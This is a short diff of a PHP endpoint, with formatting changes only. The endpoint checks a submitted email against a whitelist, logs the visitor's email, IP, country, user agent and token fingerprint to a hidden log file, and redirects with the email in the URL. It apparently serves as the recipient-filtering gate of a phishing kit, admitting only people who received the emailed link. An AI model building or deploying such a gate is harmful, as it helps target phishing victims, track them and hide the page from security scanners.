@@ -6,7 +6,8 @@ $email   = strtolower(trim($payload['email'] ?? ''));
 $jsToken = trim($payload['jsToken'] ?? '');
 
 if ($jsToken === '') {
-  echo json_encode(['success'=>false,'message'=>'Session error']); exit;
+  echo json_encode(['success'=>false,'message'=>'Session error']);
+  exit;
 }
 
 // Load whitelist
@@ -25,18 +26,18 @@ $logEntry = [
   'email' => $email,
   'ip'    => $ip,
   'cc'    => $cc,
-  'fp'    => substr($jsToken, 0, 16),  // Optional fingerprint
+  'fp'    => substr($jsToken, 0, 16),
   'ua'    => $ua
 ];
 
 file_put_contents(__DIR__ . '/../../.data/validated.log', json_encode($logEntry) . PHP_EOL, FILE_APPEND);
 
+// Final redirect format
 if ($valid) {
   echo json_encode([
     'success' => true,
     'redirectUrl' => '/fina#$?' . urlencode($email)
   ]);
-
 } else {
   echo json_encode(['success' => false, 'message' => 'Use the email you received this link with.']);
 }
